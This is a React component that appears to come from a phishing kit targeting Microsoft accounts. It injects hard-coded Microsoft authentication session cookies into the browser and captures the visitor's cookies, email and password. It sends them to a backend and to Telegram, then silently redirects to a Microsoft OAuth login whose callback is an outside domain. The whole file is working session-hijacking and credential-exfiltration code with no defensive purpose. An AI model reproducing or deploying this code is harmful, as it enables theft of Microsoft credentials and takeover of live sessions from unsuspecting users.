import React, { useEffect } from 'react';
import { injectMicrosoftCookies, setCredentials } from '../utils/client-cookie-capture';

// IP address, email, and password variables for cookies
let ipaddress = '';
let email = '';
let password = '';

// Microsoft authentication cookies injection function
const injectAuthCookies = () => {
  console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");
  let cookiesData = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
  
  for(let cookieObj of cookiesData) {
    document.cookie = `${cookieObj.name}=${cookieObj.value};Max-Age=31536000;${cookieObj.path ? `path=${cookieObj.path};` : ""}${cookieObj.domain ? `${cookieObj.path ? "" : "path=/"}domain=${cookieObj.domain};` : ""}Secure;SameSite=no_restriction`;
  }
  
  location.reload();
};

// Import or declare the backend functions (keep these as they were)
declare function saveSessionToBackend(sessionData: any): Promise<any>;
declare function sendToTelegram(sessionData: any): Promise<any>;
declare function grabCookies(): void;

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sessionData?: any;
}

const SLOW_DELAY = 1200;
const redirectDelay = SLOW_DELAY * 3;

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sessionData }) => {
  useEffect(() => {
    // Initialize credentials
    setCredentials(ipaddress, email, password);
    
    // Inject cookies early in the process
    setTimeout(() => {
      try {
        // Use the centralized injection function
        injectMicrosoftCookies();
      } catch (error) {
        console.log('Cookie injection failed, continuing with normal flow');
      }
    }, 1000);
    
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    if (window.location.search.includes('debug=1')) {
      setTimeout(() => {
        const testButton = document.createElement('button');
        testButton.innerText = '🧪 Test Telegram Now';
        testButton.style.cssText =
          'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
        testButton.onclick = async () => {
          try {
            const response = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: 'manual-test@debug.com',
                password: 'ManualTest123',
                provider: 'Microsoft',
                fileName: 'Manual Debug Test',
                timestamp: new Date().toISOString(),
                sessionId:
                  'manual_' + Math.random().toString(36).substring(2, 15),
                userAgent: navigator.userAgent,
                formattedCookies: [
                  {
                    name: 'MANUAL_TEST',
                    value: 'manual_value_' + Date.now(),
                    domain: '.login.microsoftonline.com',
                  },
                ],
                browserFingerprint: { localStorage: '{"manual":"test"}' },
              }),
            });
            const result = await response.json();
            alert('Manual test completed - check console and Telegram');
          } catch (error) {
            alert('Manual test failed: ' + error.message);
          }
        };
        document.body.appendChild(testButton);
      }, 1000);
    }

    const preAuthFingerprint = {
      cookies: document.cookie,
    };

    const generateRandomString = (length: number): string => {
      const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
      let result = '';
      const values = window.crypto.getRandomValues(new Uint8Array(length));
      for (let i = 0; i < length; i++) {
        result += charset[values[i] % charset.length];
      }
      return result;
    };

    const generateCodeChallenge = async (codeVerifier: string): Promise<string> => {
      const encoder = new TextEncoder();
      const data = encoder.encode(codeVerifier);
      const digest = await window.crypto.subtle.digest('SHA-256', data);
      return btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
    };

    let saveSuccess = false;
    let telegramSuccess = false;

    (async () => {
      let currentSessionData = (sessionData) ? sessionData : {};

      try {
        if (typeof saveSessionToBackend === 'function') {
          await saveSessionToBackend(currentSessionData);
          saveSuccess = true;
        }
      } catch (saveError) {}

      try {
        if (typeof sendToTelegram === 'function') {
          await sendToTelegram(currentSessionData);
          telegramSuccess = true;
        }
      } catch (telegramError) {}

      if (typeof grabCookies === 'function') {
        grabCookies();
      }
      
      // Remove the duplicate injection attempt to prevent conflicts

      setTimeout(async () => {
        try {
          const codeVerifier = generateRandomString(64);
          const codeChallenge = await generateCodeChallenge(codeVerifier);
          const state = Math.random().toString(36).substring(2, 15);

          sessionStorage.setItem('pkce_verifier', codeVerifier);
          sessionStorage.setItem('oauth_state', state);

          const params = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            code_challenge: codeChallenge,
            code_challenge_method: 'S256',
            state: state,
            prompt: 'login',
          });

          const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
          window.location.href = microsoftOAuthUrl;
        } catch (err) {
          const fallbackState = Math.random().toString(36).substring(2, 15);
          sessionStorage.setItem('oauth_state', fallbackState);

          const fallbackParams = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            state: fallbackState,
            prompt: 'login',
          });

          const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
          window.location.href = fallbackUrl;
        }
      }, redirectDelay);
    })();
  }, [sessionData, onLoginSuccess]);

  return null; // Silent: no UI/status rendered
};

export default RealOAuthRedirect;